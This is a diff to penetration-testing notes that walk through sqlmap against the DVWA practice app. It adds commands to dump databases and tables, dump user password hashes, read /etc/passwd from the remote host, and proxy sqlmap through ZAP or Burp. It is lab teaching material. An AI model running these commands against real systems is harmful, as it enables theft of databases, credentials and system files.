@@ -527,14 +527,70 @@ sqlmap -u "https://dvwa.prod.org/vulnerabilities/sqli/?id=1&Submit=Submit" --coo
 
 * Once you are able to dump the database names with sqlmap, now enumerate the tables in your database of interest&#x20;
 
-<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-* Say we want the tables out of the `sqli` database
+#### Dumping a Database
+
+```
+sqlmap -u "https://dvwa.prod.org/vulnerabilities/sqli/?id=1&Submit=Submit" -D sqli --dump
+```
+
+* However, say we want the tables out of the `sqli` database
 
 ```
 sqlmap -u "https://dvwa.prod.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="COOKIE VALUE" -D sqli --tables
 ```
 
 * Output should look something like this:
+
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+#### Dumping a Table
+
+* To dump a particular table from a database&#x20;
+
+```
+sqlmap -u "https://dvwa.prod.org/vulnerabilities/sqli/?id=1&Submit=Submit" -D sqli -T Users --dump
+```
+
+####
+
+#### File Read with SqlMap
+
+* To read a file on the remote system:
+
+```
+sqlmap -u "https://dvwa.prod.org/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --file-read /etc/passwd
+```
+
+* If successful, simply cat out the file stored now on your local system
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+#### User Password Dump
+
+* Sqlmap will automate the process of looking for users and passwords, across multiple databases
+
+```
+sqlmap -u "http://dvwa.prod.org/vulnerabilities/sqli/?id=1&Submit=Submit"  --users --passwords
+```
+
+#### Using a Proxy with Sqlmap
+
+* Burp and Zap can both be used as a proxy for sqlmap requests
+* Set your foxy proxy or other extension to use zap to proxy requests
+* Start zap (should go without saying)
+
+```
+sqlmap -u "https://dvwa.prod.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lj1gugoprduur56u8lml5q373c; security=low" --proxy http://localhost:8081 --batch
+```
+
+* Proxy with burp request read&#x20;
+
+```
+sqlmap -r burp.request --cookie="PHPSESSID=lj1gugoprduur56u8lml5q373c; security=low" --proxy http://localhost:8081 --batch
+```
+
+* Now you can go through your zap history and see the exact requests sqlmap is making (will need to url decode in most cases
 
 <figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
